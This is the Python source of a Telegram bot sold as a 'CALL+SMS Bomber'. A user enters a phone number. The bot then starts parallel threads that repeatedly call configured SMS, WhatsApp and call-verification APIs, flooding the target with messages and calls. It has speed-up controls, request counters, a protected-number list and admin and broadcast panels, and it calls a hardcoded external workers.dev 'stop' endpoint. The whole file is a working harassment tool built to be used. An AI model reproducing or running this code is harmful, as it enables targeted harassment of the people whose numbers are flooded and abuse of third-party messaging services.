import os
import logging
import asyncio
import json
import io
import threading
import time
import random
import requests
from datetime import datetime
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.constants import ParseMode
import aiohttp

import config
from database import (
    init_db, add_user, is_admin, is_owner, ban_user, unban_user, delete_user,
    get_all_users_paginated, get_recent_users_paginated, get_user_by_id,
    update_user_target, get_user_target, set_admin_role, get_user_count, get_all_user_ids,
    update_user_phone, get_user_phone,
    add_protected_number, remove_protected_number, is_protected, get_all_protected_numbers
)

load_dotenv()

logging.basicConfig(format=config.LOG_FORMAT, level=config.LOG_LEVEL)
logger = logging.getLogger(__name__)

# Thread-safe global state
bombing_active = {}
bombing_threads = {}
user_intervals = {}
user_start_time = {}
request_counts = {}
global_request_counter = threading.Lock()

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

# ---------- Helpers ----------
def is_user_allowed(user_id: int) -> bool:
    user = get_user_by_id(user_id)
    return user is None or not user['banned']

async def get_missing_channels(user_id, context):
    missing = []
    for ch in config.FORCE_CHANNELS:
        try:
            member = await context.bot.get_chat_member(chat_id=ch["id"], user_id=user_id)
            if member.status not in ("member", "administrator", "creator"):
                missing.append(ch)
        except:
            missing.append(ch)
    return missing

async def send_force_channel_prompt(query, context, missing):
    kb = []
    for ch in missing:
        kb.append([InlineKeyboardButton(f"Join {ch['name']}", url=ch['link'])])
    kb.append([InlineKeyboardButton("✅ Joined", callback_data="check_force_channels")])
    kb.append([InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")])
    await query.edit_message_text(
        "⚠️ Join these channels:\n" + "\n".join([f"• {ch['name']}" for ch in missing]),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(kb)
    )

async def send_any_message(context, chat_id, update, text=None):
    """Send any message type (text, media, etc.) to a user."""
    try:
        msg = update.message
        if msg.reply_to_message:
            await context.bot.copy_message(chat_id, update.effective_chat.id, msg.reply_to_message.message_id)
            return True
        elif msg.photo:
            await context.bot.send_photo(chat_id, msg.photo[-1].file_id, caption=msg.caption or "")
            return True
        elif msg.video:
            await context.bot.send_video(chat_id, msg.video.file_id, caption=msg.caption or "")
            return True
        elif msg.audio:
            await context.bot.send_audio(chat_id, msg.audio.file_id, caption=msg.caption or "")
            return True
        elif msg.voice:
            await context.bot.send_voice(chat_id, msg.voice.file_id, caption=msg.caption or "")
            return True
        elif msg.sticker:
            await context.bot.send_sticker(chat_id, msg.sticker.file_id)
            return True
        elif msg.document:
            await context.bot.send_document(chat_id, msg.document.file_id, caption=msg.caption or "")
            return True
        elif msg.poll:
            await context.bot.send_poll(chat_id, question=msg.poll.question, options=[opt.text for opt in msg.poll.options])
            return True
        elif text:
            await context.bot.send_message(chat_id=chat_id, text=text)
            return True
        else:
            await context.bot.forward_message(chat_id, update.effective_chat.id, msg.message_id)
            return True
    except Exception as e:
        logger.error(f"send_any_message error to {chat_id}: {e}")
        return False

# ---------- API Caller ----------
def call_api(pn: str, cc: str, idx: int) -> bool:
    """Execute API request from config.API_CONFIGS. Supports {phone}, {pn}, {cc} placeholders."""
    try:
        api = config.API_CONFIGS[idx]
        url = api['url'].format(phone=pn, pn=pn, cc=cc)
        headers = {}
        for k, v in api.get('headers', {}).items():
            if isinstance(v, str):
                headers[k] = v.replace('{phone}', pn).replace('{pn}', pn).replace('{cc}', cc)
            else:
                headers[k] = v
        data = api.get('data')
        if data is not None:
            import copy
            data = copy.deepcopy(data)
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, str):
                        data[k] = v.replace('{phone}', pn).replace('{pn}', pn).replace('{cc}', cc)
            elif isinstance(data, str):
                data = data.replace('{phone}', pn).replace('{pn}', pn).replace('{cc}', cc)
        cookies = api.get('cookies')
        method = api.get('method', 'get').lower()
        if method == 'get':
            resp = session.get(url, headers=headers, cookies=cookies, timeout=3)
        else:
            if isinstance(data, (dict, list)):
                resp = session.post(url, headers=headers, cookies=cookies, json=data, timeout=3)
            else:
                resp = session.post(url, headers=headers, cookies=cookies, data=data, timeout=3)
        if 'success_text' in api:
            return api['success_text'].lower() in resp.text.lower()
        return resp.status_code == 200
    except Exception:
        return False

# ---------- Workers ----------
def sms_api_worker(user_id, phone, idx, stop_flag):
    """One thread per SMS / WhatsApp API."""
    cc = config.DEFAULT_COUNTRY_CODE
    while not stop_flag.is_set():
        interval = user_intervals.get(user_id, config.BOMBING_INTERVAL_SECONDS)
        call_api(phone, cc, idx)
        with global_request_counter:
            request_counts[user_id] = request_counts.get(user_id, 0) + 1
        for _ in range(int(interval * 2)):
            if stop_flag.is_set():
                break
            time.sleep(0.5)

def call_cycle_worker(user_id, phone, call_indices, stop_flag):
    """Single thread that cycles through CALL APIs with 20‑25s delay."""
    cc = config.DEFAULT_COUNTRY_CODE
    while not stop_flag.is_set():
        for idx in call_indices:
            if stop_flag.is_set():
                break
            call_api(phone, cc, idx)
            with global_request_counter:
                request_counts[user_id] = request_counts.get(user_id, 0) + 1
            delay = random.randint(20, 25)
            for _ in range(delay):
                if stop_flag.is_set():
                    break
                time.sleep(1)

# ---------- Bombing Task ----------
async def perform_bombing(user_id, phone, context):
    stop_flag = threading.Event()
    bombing_active[user_id] = stop_flag
    request_counts[user_id] = 0
    user_intervals[user_id] = config.BOMBING_INTERVAL_SECONDS
    user_start_time[user_id] = time.time()
    update_user_target(user_id, phone)

    auto_stop = None if (is_admin(user_id) or is_owner(user_id)) else config.NORMAL_USER_AUTO_STOP_SECONDS

    # Log to channel
    try:
        user = await context.bot.get_chat(user_id)
        name = user.first_name or "Unknown"
        uname = user.username or "none"
        await context.bot.send_message(
            chat_id=config.LOG_CHANNEL_ID,
            text=f"🚨 Bomber started\n👤 {name} (@{uname})\n📱 {phone}\n⏰ {datetime.now().strftime('%c')}",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        logger.error(f"Log error: {e}")

    sms_indices = [i for i in config.API_INDICES if config.API_CONFIGS[i]['type'] in ('SMS', 'WHATSAPP')]
    call_indices = [i for i in config.API_INDICES if config.API_CONFIGS[i]['type'] == 'CALL']

    workers = []
    for i in sms_indices:
        t = threading.Thread(target=sms_api_worker, args=(user_id, phone, i, stop_flag), daemon=True)
        workers.append(t)
        t.start()
    if call_indices:
        t = threading.Thread(target=call_cycle_worker, args=(user_id, phone, call_indices, stop_flag), daemon=True)
        workers.append(t)
        t.start()
    bombing_threads[str(user_id)] = workers

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 Stop", callback_data="stop_bombing"),
         InlineKeyboardButton("⚡ Speed Up", callback_data="speed_up"),
         InlineKeyboardButton("🐢 Speed Down", callback_data="speed_down")],
        [InlineKeyboardButton("📋 Main Menu", callback_data="main_menu")]
    ])
    msg = await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ Bomber on <code>{phone}</code>\n⏱️ Interval: {config.BOMBING_INTERVAL_SECONDS}s\n📊 0 requests",
        parse_mode=ParseMode.HTML,
        reply_markup=kb
    )
    last_cnt = 0
    last_upd = time.time()

    try:
        while not stop_flag.is_set():
            await asyncio.sleep(1)
            cnt = request_counts.get(user_id, 0)
            now = time.time()
            if auto_stop and (now - user_start_time[user_id] >= auto_stop):
                stop_flag.set()
                break
            if cnt > last_cnt and (now - last_upd) >= config.TELEGRAM_RATE_LIMIT_SECONDS:
                interval = user_intervals.get(user_id, config.BOMBING_INTERVAL_SECONDS)
                txt = f"✅ Bomber on <code>{phone}</code>\n⏱️ Interval: {interval}s\n📊 {cnt} requests"
                try:
                    await context.bot.edit_message_text(chat_id=user_id, message_id=msg.message_id,
                                                        text=txt, parse_mode=ParseMode.HTML, reply_markup=kb)
                except:
                    msg = await context.bot.send_message(chat_id=user_id, text=txt,
                                                         parse_mode=ParseMode.HTML, reply_markup=kb)
                last_cnt = cnt
                last_upd = now
            if cnt >= config.MAX_REQUEST_LIMIT:
                stop_flag.set()
                break
    finally:
        stop_flag.set()
        for t in workers:
            t.join(timeout=2)
        bombing_threads.pop(str(user_id), None)
        final_cnt = request_counts.pop(user_id, 0)
        user_intervals.pop(user_id, None)
        user_start_time.pop(user_id, None)
        bombing_active.pop(user_id, None)

        # Stop API for index 33
        try:
            stop_url = f"https://bomber-rootxindia.satyamrajsingh562.workers.dev/stop?key=demo&n={phone}"
            session.get(stop_url, timeout=3)
        except:
            pass

        await context.bot.edit_message_text(
            chat_id=user_id, message_id=msg.message_id,
            text=f"✅ Completed for <code>{phone}</code>\n📊 Total: {final_cnt} requests{config.BRANDING}",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 Main Menu", callback_data="main_menu")]])
        )

# ---------- Main Menu ----------
def main_menu_keyboard(uid):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💣 Start Bomber", callback_data="bomb_start")],
        [InlineKeyboardButton("🛑 Stop", callback_data="stop_bombing")],
        [InlineKeyboardButton("⚡ Speed Up", callback_data="speed_up"),
         InlineKeyboardButton("🐢 Speed Down", callback_data="speed_down")],
        [InlineKeyboardButton("📋 Menu", callback_data="main_menu")],
    ])

async def show_admin_panel(target, user_id):
    kb = [
        [InlineKeyboardButton("👥 List Users", callback_data="admin_list_users"),
         InlineKeyboardButton("🕒 Recent Users", callback_data="admin_recent_users")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
         InlineKeyboardButton("📨 Direct Message", callback_data="admin_dm")],
        [InlineKeyboardButton("🔍 User Lookup", callback_data="admin_lookup"),
         InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban")],
        [InlineKeyboardButton("🔓 Unban User", callback_data="admin_unban"),
         InlineKeyboardButton("🗑 Delete User", callback_data="admin_delete")],
        [InlineKeyboardButton("➕ Add Admin", callback_data="admin_addadmin"),
         InlineKeyboardButton("➖ Remove Admin", callback_data="admin_removeadmin")],
        [InlineKeyboardButton("🛡️ Protect Number", callback_data="admin_protect"),
         InlineKeyboardButton("🛡️ Unprotect Number", callback_data="admin_unprotect")],
        [InlineKeyboardButton("📜 List Protected", callback_data="admin_list_protected"),
         InlineKeyboardButton("💾 Backup", callback_data="admin_backup")],
    ]
    if is_owner(user_id):
        kb.append([InlineKeyboardButton("💾 Full Backup (Owner)", callback_data="admin_fullbackup")])
    kb.append([InlineKeyboardButton("🔙 Back to Main", callback_data="main_menu")])
    if hasattr(target, 'edit_message_text'):
        await target.edit_message_text("👑 <b>Admin Panel</b>", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
    else:
        await target.reply_text("👑 <b>Admin Panel</b>", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

# ---------- Commands ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    add_user(user.id, user.username, user.first_name)
    if not is_user_allowed(user.id):
        await update.message.reply_text("🚫 You are banned.")
        return
    await update.message.reply_text(
        f"Welcome {user.first_name}!\nCALL+SMS Bomber ready.",
        reply_markup=main_menu_keyboard(user.id)
    )

async def menu_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Main Menu:", reply_markup=main_menu_keyboard(update.effective_user.id))

async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not (is_admin(uid) or is_owner(uid)):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await show_admin_panel(update.message, uid)

async def setphone_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /setphone <10-digit number>")
        return
    phone = ''.join(filter(str.isdigit, context.args[0]))
    if len(phone) != 10:
        await update.message.reply_text("❌ Invalid number.")
        return
    update_user_phone(uid, phone)
    await update.message.reply_text(f"✅ Your number <code>{phone}</code> registered.", parse_mode=ParseMode.HTML)

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not (is_admin(uid) or is_owner(uid)):
        return
    total = get_user_count()
    active = len(bombing_active)
    prot = len(get_all_protected_numbers())
    text = f"👥 Users: {total}\n💣 Active bombers: {active}\n🛡️ Protected: {prot}"
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def ping_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🏓 Pong!")

# ---------- Callback Handler ----------
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if data != "main_menu" and not is_user_allowed(user_id):
        await query.answer("You are banned.", show_alert=True)
        return

    if data == "main_menu":
        await query.edit_message_text("📋 Main Menu", reply_markup=main_menu_keyboard(user_id))
        context.user_data.clear()
        return

    elif data == "bomb_start":
        context.user_data['state'] = config.State.AWAITING_PHONE
        await query.edit_message_text(
            "📱 Send 10‑digit phone number:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="main_menu")]])
        )
        return

    elif data == "stop_bombing":
        if user_id in bombing_active and not bombing_active[user_id].is_set():
            bombing_active[user_id].set()
            await query.edit_message_text("🛑 Stopped.")
        else:
            await query.edit_message_text("ℹ️ No active bomber.")
        return

    elif data in ("speed_up", "speed_down"):
        if user_id not in bombing_active or bombing_active[user_id].is_set():
            await query.edit_message_text("No active bomber.")
            return
        cur = user_intervals.get(user_id, config.BOMBING_INTERVAL_SECONDS)
        new = max(config.MIN_INTERVAL, cur - 1) if data == "speed_up" else min(config.MAX_INTERVAL, cur + 1)
        user_intervals[user_id] = new
        await query.edit_message_text(f"Interval set to {new}s.")
        return

    elif data == "check_force_channels":
        missing = await get_missing_channels(user_id, context)
        if missing:
            await send_force_channel_prompt(query, context, missing)
        else:
            phone = context.user_data.get('phone')
            if phone:
                if not (is_admin(user_id) or is_owner(user_id)) and is_protected(phone):
                    await query.edit_message_text("⚠️ Number protected.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Main Menu", callback_data="main_menu")]]))
                    return
                asyncio.create_task(perform_bombing(user_id, phone, context))
                await query.edit_message_text("✅ Started.")
                context.user_data.clear()
            else:
                await query.edit_message_text("✅ Ready.", reply_markup=main_menu_keyboard(user_id))
        return

    elif data == "confirm_bomb":
        phone = context.user_data.get('phone')
        if not phone:
            return
        if not (is_admin(user_id) or is_owner(user_id)) and is_protected(phone):
            await query.edit_message_text("⚠️ Protected number.")
            return
        if not (is_admin(user_id) or is_owner(user_id)):
            missing = await get_missing_channels(user_id, context)
            if missing:
                context.user_data['phone'] = phone
                await send_force_channel_prompt(query, context, missing)
                return
        asyncio.create_task(perform_bombing(user_id, phone, context))
        await query.edit_message_text("✅ Started.")
        context.user_data.clear()
        return

    # Admin callbacks (require admin)
    elif data.startswith("admin_") or data.startswith("list_users_page") or data.startswith("recent_users_page") or data.startswith("protected_page"):
        if not (is_admin(user_id) or is_owner(user_id)):
            await query.answer("⛔ Admins only.", show_alert=True)
            return
        await handle_admin_callback(update, context)
        return

    await query.edit_message_text("Unknown.", reply_markup=main_menu_keyboard(user_id))

async def handle_admin_callback(update, context):
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id

    if data == "admin_panel":
        await show_admin_panel(query, user_id)
        return

    # Pagination: List Users
    elif data.startswith("admin_list_users") or data.startswith("list_users_page"):
        page = 0
        if data.startswith("list_users_page:"):
            page = int(data.split(":")[1])
        per_page = 15
        users = get_all_users_paginated(page, per_page)
        if not users:
            await query.edit_message_text("No users found.")
            return
        text = f"👥 <b>Users (Page {page+1})</b>\n\n"
        for u in users:
            text += f"🆔 {u['user_id']} | @{u['username'] or 'no_username'} | {u['first_name'] or ''} | {'🔴 Banned' if u['banned'] else '🟢 Active'}\n"
        kb = []
        row = []
        if page > 0:
            row.append(InlineKeyboardButton("◀️ Previous", callback_data=f"list_users_page:{page-1}"))
        if len(users) == per_page:
            row.append(InlineKeyboardButton("Next ▶️", callback_data=f"list_users_page:{page+1}"))
        if row:
            kb.append(row)
        kb.append([InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_panel")])
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

    # Pagination: Recent Users
    elif data.startswith("admin_recent_users") or data.startswith("recent_users_page"):
        page = 0
        if data.startswith("recent_users_page:"):
            page = int(data.split(":")[1])
        per_page = 15
        users = get_recent_users_paginated(page, per_page)
        if not users:
            await query.edit_message_text("No recent users found.")
            return
        text = f"🕒 <b>Recent Users (Page {page+1})</b>\n\n"
        for u in users:
            text += f"🆔 {u['user_id']} | @{u['username'] or 'no_username'} | Joined: {u['joined_at']}\n"
        kb = []
        row = []
        if page > 0:
            row.append(InlineKeyboardButton("◀️ Previous", callback_data=f"recent_users_page:{page-1}"))
        if len(users) == per_page:
            row.append(InlineKeyboardButton("Next ▶️", callback_data=f"recent_users_page:{page+1}"))
        if row:
            kb.append(row)
        kb.append([InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_panel")])
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

    elif data == "admin_backup":
        users = get_all_users_paginated(0, 999999)
        data_json = [dict(u) for u in users]
        backup = json.dumps(data_json, default=str, indent=2)
        file = io.BytesIO(backup.encode())
        file.name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        await query.message.reply_document(document=file, filename=file.name, caption="Backup of users.")
        await query.edit_message_text("✅ Backup sent.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))

    elif data == "admin_fullbackup":
        if not is_owner(user_id):
            return
        users = get_all_users_paginated(0, 999999)
        data_json = [dict(u) for u in users]
        backup = json.dumps(data_json, default=str, indent=2)
        file = io.BytesIO(backup.encode())
        file.name = f"fullbackup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        await query.message.reply_document(document=file, filename=file.name, caption="Full backup.")
        await query.edit_message_text("✅ Full backup sent.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))

    # Pagination: Protected Numbers
    elif data == "admin_list_protected" or data.startswith("protected_page:"):
        page = 0
        if data.startswith("protected_page:"):
            page = int(data.split(":")[1])
        per_page = 15
        nums = get_all_protected_numbers()
        total = len(nums)
        start = page * per_page
        end = start + per_page
        page_nums = nums[start:end]
        if not page_nums:
            await query.edit_message_text("No protected numbers.")
            return
        text = f"🛡️ <b>Protected (Page {page+1})</b>\n\n"
        for n in page_nums:
            text += f"<code>{n}</code>\n"
        kb = []
        row = []
        if page > 0:
            row.append(InlineKeyboardButton("◀️ Previous", callback_data=f"protected_page:{page-1}"))
        if end < total:
            row.append(InlineKeyboardButton("Next ▶️", callback_data=f"protected_page:{page+1}"))
        if row:
            kb.append(row)
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="admin_panel")])
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

    # Set states for admin actions
    elif data == "admin_ban":
        context.user_data['state'] = config.State.AWAITING_ADMIN_BAN
        await query.edit_message_text("🚫 Send user ID to ban:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_panel")]]))
    elif data == "admin_unban":
        context.user_data['state'] = config.State.AWAITING_ADMIN_UNBAN
        await query.edit_message_text("🔓 Send user ID to unban:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_panel")]]))
    elif data == "admin_delete":
        context.user_data['state'] = config.State.AWAITING_ADMIN_DELETE
        await query.edit_message_text("🗑 Send user ID to delete:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_panel")]]))
    elif data == "admin_lookup":
        context.user_data['state'] = config.State.AWAITING_ADMIN_LOOKUP
        await query.edit_message_text("🔍 Send user ID to look up:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_panel")]]))
    elif data == "admin_addadmin":
        context.user_data['state'] = config.State.AWAITING_ADMIN_ADDADMIN
        await query.edit_message_text("➕ Send user ID to promote:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_panel")]]))
    elif data == "admin_removeadmin":
        context.user_data['state'] = config.State.AWAITING_ADMIN_REMOVEADMIN
        await query.edit_message_text("➖ Send user ID to demote:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_panel")]]))
    elif data == "admin_protect":
        context.user_data['state'] = config.State.AWAITING_ADMIN_PROTECT
        await query.edit_message_text("🛡️ Send phone to protect:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_panel")]]))
    elif data == "admin_unprotect":
        context.user_data['state'] = config.State.AWAITING_ADMIN_UNPROTECT
        await query.edit_message_text("🛡️ Send phone to unprotect:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_panel")]]))
    elif data == "admin_broadcast":
        context.user_data['state'] = config.State.AWAITING_ADMIN_BROADCAST
        await query.edit_message_text("📢 Send message to broadcast:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_panel")]]))
    elif data == "admin_dm":
        context.user_data['state'] = config.State.AWAITING_ADMIN_DM_TARGET
        await query.edit_message_text("📨 Send user ID to DM:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_panel")]]))

# ---------- Message Handler (States) ----------
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = context.user_data.get('state', config.State.NONE)
    msg = update.message

    if not is_user_allowed(user_id):
        await msg.reply_text("🚫 You are banned.")
        return

    if state == config.State.AWAITING_PHONE:
        if not msg.text:
            await msg.reply_text("Please send a number.")
            return
        phone = ''.join(filter(str.isdigit, msg.text))
        if len(phone) < 10 or len(phone) > 15:
            await msg.reply_text("Invalid number.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="main_menu")]]))
            return
        user_phone = get_user_phone(user_id)
        if user_phone and user_phone == phone:
            await msg.reply_text("⚠️ You cannot bomb your own number.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="main_menu")]]))
            return
        context.user_data['phone'] = phone
        context.user_data['state'] = config.State.AWAITING_CONFIRM
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Confirm", callback_data="confirm_bomb"),
             InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
        ])
        await msg.reply_text(
            f"📱 Target: <code>{phone}</code>\nStart CALL+SMS bomber?",
            parse_mode=ParseMode.HTML,
            reply_markup=kb
        )

    elif state == config.State.AWAITING_ADMIN_BAN:
        try:
            target = int(msg.text)
            if ban_user(target):
                await msg.reply_text(f"✅ User {target} banned.")
            else:
                await msg.reply_text("❌ User not found.")
        except:
            await msg.reply_text("Invalid user ID.")
        context.user_data.clear()
        await msg.reply_text("Back to Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]))

    elif state == config.State.AWAITING_ADMIN_UNBAN:
        try:
            target = int(msg.text)
            if unban_user(target):
                await msg.reply_text(f"✅ User {target} unbanned.")
            else:
                await msg.reply_text("❌ User not found.")
        except:
            await msg.reply_text("Invalid user ID.")
        context.user_data.clear()
        await msg.reply_text("Back to Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]))

    elif state == config.State.AWAITING_ADMIN_DELETE:
        try:
            target = int(msg.text)
            if delete_user(target):
                await msg.reply_text(f"✅ User {target} deleted.")
            else:
                await msg.reply_text("❌ User not found.")
        except:
            await msg.reply_text("Invalid user ID.")
        context.user_data.clear()
        await msg.reply_text("Back to Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]))

    elif state == config.State.AWAITING_ADMIN_LOOKUP:
        try:
            uid = int(msg.text)
            user = get_user_by_id(uid)
            if not user:
                await msg.reply_text("User not found.")
            else:
                tgt = get_user_target(uid) or "None"
                text = (
                    f"👤 <b>User {uid}</b>\n"
                    f"Username: @{user['username']}\n"
                    f"Name: {user['first_name']}\n"
                    f"Role: {user['role']}\n"
                    f"Banned: {bool(user['banned'])}\n"
                    f"Target: {tgt}"
                    f"{config.BRANDING}"
                )
                await msg.reply_text(text, parse_mode=ParseMode.HTML)
        except:
            await msg.reply_text("Invalid user ID.")
        context.user_data.clear()
        await msg.reply_text("Back to Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]))

    elif state == config.State.AWAITING_ADMIN_ADDADMIN:
        try:
            uid = int(msg.text)
            set_admin_role(uid, True)
            await msg.reply_text(f"✅ User {uid} is now admin.")
        except:
            await msg.reply_text("Invalid user ID.")
        context.user_data.clear()
        await msg.reply_text("Back to Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]))

    elif state == config.State.AWAITING_ADMIN_REMOVEADMIN:
        try:
            uid = int(msg.text)
            set_admin_role(uid, False)
            await msg.reply_text(f"✅ User {uid} demoted from admin.")
        except:
            await msg.reply_text("Invalid user ID.")
        context.user_data.clear()
        await msg.reply_text("Back to Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]))

    elif state == config.State.AWAITING_ADMIN_PROTECT:
        phone = ''.join(filter(str.isdigit, msg.text))
        if len(phone) < 10:
            await msg.reply_text("Invalid number.")
            return
        if add_protected_number(phone, user_id):
            await msg.reply_text(f"✅ Number <code>{phone}</code> protected.", parse_mode=ParseMode.HTML)
        else:
            await msg.reply_text("⚠️ Already protected.")
        context.user_data.clear()
        await msg.reply_text("Back to Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]))

    elif state == config.State.AWAITING_ADMIN_UNPROTECT:
        phone = ''.join(filter(str.isdigit, msg.text))
        if len(phone) < 10:
            await msg.reply_text("Invalid number.")
            return
        if remove_protected_number(phone):
            await msg.reply_text(f"✅ Protection removed for <code>{phone}</code>.", parse_mode=ParseMode.HTML)
        else:
            await msg.reply_text("⚠️ Not protected.")
        context.user_data.clear()
        await msg.reply_text("Back to Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]))

    elif state == config.State.AWAITING_ADMIN_DM_TARGET:
        try:
            target = int(msg.text)
            context.user_data['dm_target'] = target
            context.user_data['state'] = config.State.AWAITING_ADMIN_DM_MESSAGE
            await msg.reply_text(
                f"✅ Recipient set: {target}\nNow send the message to DM.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_panel")]])
            )
        except:
            await msg.reply_text("Invalid user ID.")
            context.user_data.clear()

    elif state == config.State.AWAITING_ADMIN_DM_MESSAGE:
        target = context.user_data.get('dm_target')
        if not target:
            await msg.reply_text("Error: No target set.")
            return
        success = await send_any_message(context, target, update, msg.text if msg.text else None)
        if success:
            await msg.reply_text(f"✅ Message sent to {target}.")
        else:
            await msg.reply_text("❌ Failed to send message.")
        context.user_data.clear()
        await msg.reply_text("Back to Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]))

    elif state == config.State.AWAITING_ADMIN_BROADCAST:
        users = get_all_user_ids()
        if not users:
            await msg.reply_text("No users.")
            return
        status_msg = await msg.reply_text(f"📢 Broadcasting to {len(users)} users...")
        success = 0
        for uid in users:
            if await send_any_message(context, uid, update, msg.text if msg.text else None):
                success += 1
        await status_msg.edit_text(f"📢 Sent to {success}/{len(users)} users.")
        context.user_data.clear()
        await msg.reply_text("Back to Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]))

    else:
        await msg.reply_text("Use the menu.", reply_markup=main_menu_keyboard(user_id))

# ---------- Keep-alive ----------
async def keep_alive():
    while True:
        await asyncio.sleep(5 * 60)
        try:
            async with aiohttp.ClientSession() as s:
                await s.get(config.WEBHOOK_URL)
        except:
            pass

# ---------- Error Handler ----------
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")

# ---------- Main ----------
def main():
    init_db()
    app = Application.builder().token(config.BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", menu_cmd))
    app.add_handler(CommandHandler("admin", admin_cmd))
    app.add_handler(CommandHandler("setphone", setphone_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("ping", ping_cmd))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_error_handler(error_handler)

    loop = asyncio.get_event_loop()
    loop.create_task(keep_alive())

    if config.WEBHOOK_URL:
        webhook_url = f"{config.WEBHOOK_URL}/webhook"
        app.run_webhook(listen="0.0.0.0", port=config.PORT, url_path="webhook", webhook_url=webhook_url)
    else:
        logger.error("WEBHOOK_URL not set.")

if __name__ == "__main__":
    main()
